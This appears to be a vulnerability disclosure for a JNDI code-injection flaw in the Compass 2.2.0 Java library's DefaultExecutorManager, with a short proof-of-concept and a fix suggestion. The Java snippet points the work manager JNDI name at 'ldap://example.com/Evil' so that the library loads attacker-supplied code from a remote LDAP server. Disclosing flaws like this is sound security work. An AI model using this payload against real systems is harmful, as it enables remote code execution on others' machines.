# Code injection Vulnerability in org.compass-project:compass:2.2.0

**Affected Version**
The latest version 2.2.0 and below.

**Affected Components**

```
org/compass/core/executor/DefaultExecutorManager.java
```

**Describe the Vulnerability**
There is a method, `org.compass.core.executor.DefaultExecutorManager.configure`, designed to configure executor. However, passing an unchecked argument to this API can lead to the execution of arbitrary commands. For instance, following codes can lead to the execution of arbitrary commands from attackers:

```java
        DefaultExecutorManager manager = new DefaultExecutorManager();
        CompassSettings settings = new CompassSettings(FooBar.class.getClassLoader());
        settings.setSetting("compass.executorManager.type", "commonj");
        settings.setSetting("compass.executorManager.workManager.workManagerJndiName", "ldap://example.com/Evil");
        manager.configure(settings);
```

**To Reproduce**
First, build an LDAP server and provide malicious codes. Then, just execute above codes will reproduce it.

**Fix Suggestion**
Filter LDAP, RMI and related protocols when using `lookup`.